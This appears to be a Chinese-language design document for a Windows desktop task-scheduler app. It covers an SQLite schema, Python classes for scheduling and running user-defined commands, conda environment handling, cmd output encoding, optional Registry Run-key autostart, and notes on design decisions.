```sql
CREATE TABLE tasks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,                    -- 任务名称
    description TEXT,                      -- 任务描述
    command TEXT NOT NULL,                 -- 执行的命令
    working_dir TEXT,                      -- 工作目录
    schedule_type TEXT NOT NULL,           -- 调度类型: daily/weekly/monthly
    schedule_config TEXT NOT NULL,         -- 调度配置(JSON)
    condition TEXT,                        -- 执行条件
    enabled BOOLEAN DEFAULT 1,             -- 是否启用
    priority INTEGER DEFAULT 0,            -- 优先级(用于排序)
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

```sql
CREATE TABLE task_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    task_id INTEGER NOT NULL,

    exit_code INTEGER,                     -- 退出代码
```

## 🔧 核心功能实现细节

### 1. 任务调度器设计
```python
class TaskScheduler:
    def __init__(self):
        self.scheduler = BackgroundScheduler()
        self.running_tasks = {}  # 当前运行的任务
        self.task_queue = []     # 任务队列
        
    def add_task(self, task):
        # 创建调度器任务
        trigger = self._create_trigger(task)
        self.scheduler.add_job(
            func=self._execute_task_wrapper,
            trigger=trigger,
            args=[task.id],
            id=f'task_{task.id}',
            name=task.name,
            replace_existing=True
        )
    
    def _execute_task_wrapper(self, task_id):
        # 包装执行，确保串行
        if self.running_tasks:
            # 有任务正在运行，加入队列
            self.task_queue.append(task_id)
        else:
            # 立即执行
            self._execute_task(task_id)
    
    def _execute_task(self, task_id):
        # 实际执行任务
        task = self.db.get_task(task_id)
        if not task or not task.enabled:
            return
            
        # 检查条件
        if not self._check_condition(task.condition):
            return
            
        # 执行命令
        executor = TaskExecutor()
        result = executor.execute(task.command, task.working_dir)
        
        # 处理结果
        self._handle_task_result(task_id, result)
        
        # 检查队列中是否有等待的任务
        if self.task_queue:
            next_task_id = self.task_queue.pop(0)
            self._execute_task(next_task_id)
```

### 2. 命令执行器（支持conda环境）
```python
class TaskExecutor:
    def execute(self, command, working_dir=None):
        # 处理conda环境激活
        if 'conda activate' in command:
            # 解析conda环境
            env_name = self._parse_conda_env(command)
            command = self._wrap_conda_command(command, env_name)
        
        # 执行命令
        process = subprocess.Popen(
            command,
            shell=True,
            cwd=working_dir,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            encoding='utf-8',
            errors='replace',
            creationflags=subprocess.CREATE_NO_WINDOW  # Windows隐藏窗口
        )
        
        # 实时读取输出
        output_lines = []
        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            if line:
                # 编码处理
                decoded_line = EncodingHelper.decode_with_fallback(line.encode())
                output_lines.append(decoded_line)
                # 实时输出到GUI
                self.emit_output(decoded_line)
        
        return process.returncode, ''.join(output_lines)
```

### 3. 条件判断系统
```python
class ConditionEvaluator:
    def evaluate(self, condition, context):
        """
        评估条件表达式
        
        支持语法：
        - if config.key == "value"
        - if script.output == "result"
        - if date == "2024-06-01"
        - if day_of_week in [1, 2, 3, 4, 5]  # 工作日
        - 支持 and/or 组合
        """
        if not condition:
            return True
            
        # 解析条件
        tokens = self._parse_condition(condition)
        
        # 从context获取变量值
        variables = self._get_variables_from_context(context)
        
        # 评估表达式
        return self._evaluate_expression(tokens, variables)
```

class DefaultScriptProcessor:
    def __init__(self):
        self.script_dir = self._get_script_dir()
        
    def run_all_scripts(self):
        """运行所有默认脚本"""
        scripts = self.db.get_all_default_scripts()
        for script in scripts:
            try:
                output = self._run_script(script)
                # 保存输出到配置文件
                self._save_output(script, output)
                # 更新最后运行时间
                script.last_run = datetime.now()
                script.last_output = output
                self.db.update_default_script(script)
            except Exception as e:
                self.logger.error(f"默认脚本执行失败: {script.name}, 错误: {e}")
    
    def _run_script(self, script):
        """执行单个脚本"""
        # 创建临时文件
        temp_file = self._create_temp_script(script.script_content)
        
        # 执行脚本
        result = subprocess.run(
            ['python', temp_file],
            capture_output=True,
            text=True,
            encoding='utf-8'
        )
        
        # 清理临时文件
        os.remove(temp_file)
        
        return result.stdout

### 5. 编码处理（支持emoji）
```python
class EncodingHelper:
    def decode_cmd_output(self, raw_bytes):
        """
        解码cmd输出，支持emoji
        
        Windows cmd的编码问题：
        1. 默认使用系统活动代码页（通常是GBK）
        2. 需要处理特殊字符和emoji
        3. 自动检测和转换编码
        """
        # 尝试UTF-8
        try:
            text = raw_bytes.decode('utf-8')
            if self._contains_valid_emoji(text):
                return text
        except UnicodeDecodeError:
            pass
        
        # 尝试GBK
        try:
            text = raw_bytes.decode('gbk')
            # 将GBK中的emoji占位符转换回真实emoji
            text = self._fix_gbk_emoji(text)
            return text
        except UnicodeDecodeError:
            pass
        
        # 使用chardet自动检测
        detected = chardet.detect(raw_bytes)
        if detected['confidence'] > 0.7:
            try:
                return raw_bytes.decode(detected['encoding'])
            except:
                pass
        
        # 最后手段：使用replace错误处理
        return raw_bytes.decode('utf-8', errors='replace')
    
    def _fix_gbk_emoji(self, text):
        """修复GBK编码中的emoji显示问题"""
        # Windows cmd中emoji可能显示为?或乱码
        # 这里可以添加特定的修复映射
        emoji_map = {
            '?': '😀',  # 示例映射
            '??': '😂',
            # 更多映射...
        }
        
        for wrong, correct in emoji_map.items():
            text = text.replace(wrong, correct)
        
        return text
```

### 2. 开机自启动实现
```python
class AutoStartManager:
    """开机自启动管理器"""
    
    def enable_auto_start(self):
        """启用开机自启动"""
        if sys.platform == 'win32':
            self._enable_windows_auto_start()
        elif sys.platform == 'darwin':
            self._enable_mac_auto_start()
        else:
            self._enable_linux_auto_start()
    
    def _enable_windows_auto_start(self):
        """Windows开机自启动"""
        import winreg
        
        # 获取exe路径
        exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        
        # 如果是打包的exe，使用完整路径
        if getattr(sys, 'frozen', False):
            exe_path = os.path.abspath(exe_path)
        
        # 创建注册表项
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        try:
            reg_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(reg_key, "WindowsTaskScheduler", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(reg_key)
            return True
        except Exception as e:
            self.logger.error(f"设置开机自启动失败: {e}")
            return False
    
    def disable_auto_start(self):
        """禁用开机自启动"""
        if sys.platform == 'win32':
            import winreg
            
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            try:
                reg_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
                winreg.DeleteValue(reg_key, "WindowsTaskScheduler")
                winreg.CloseKey(reg_key)
                return True
            except:
                return False
```

## ⚠️ 注意事项与决策

### 1. 任务失败处理策略
**决策**：任务失败时不重试
**理由**：任务失败通常说明脚本或环境有问题，重试没有意义
**实现**：
1. 记录失败日志
2. 标记任务状态为失败
3. 通知用户（系统托盘提示）
4. 继续执行下一个任务

### 2. 数据存储策略
**决策**：所有数据放在同一目录
**理由**：便于备份和管理
**目录结构**：
```
%APPDATA%\WindowsTaskScheduler\
├── tasks.db              # SQLite数据库
├── config.json           # 主配置文件
├── logs\                 # 日志目录
│   ├── app.log          # 应用日志
│   └── task_logs\       # 任务日志
└── scripts\              # 脚本目录（可选）
```

### 3. 开机自启动方案
**方案A**：免安装版（注册表自启动）
- 优点：简单，无需安装
- 缺点：权限问题，数据目录可能分散

**方案B**：安装程序版
- 优点：标准Windows应用体验
- 缺点：需要安装过程

**决策**：先实现方案A，后续根据需求增加方案B

### 4. 图标设计细节
**组合图标**：⏰ + ♻️
- 主图标：闹钟⏰（表示定时）
- 叠加图标：循环♻️（表示循环执行）
- 颜色：奶茶色系
- 格式：ICO（Windows图标）
- 尺寸：16x16, 32x32, 48x48, 256x256

### 5. 兼容性考虑
- **Windows版本**：Windows 10/11
- **Python环境**：用户无需安装Python
- **编码问题**：重点处理cmd输出编码
- **权限问题**：避免需要管理员权限
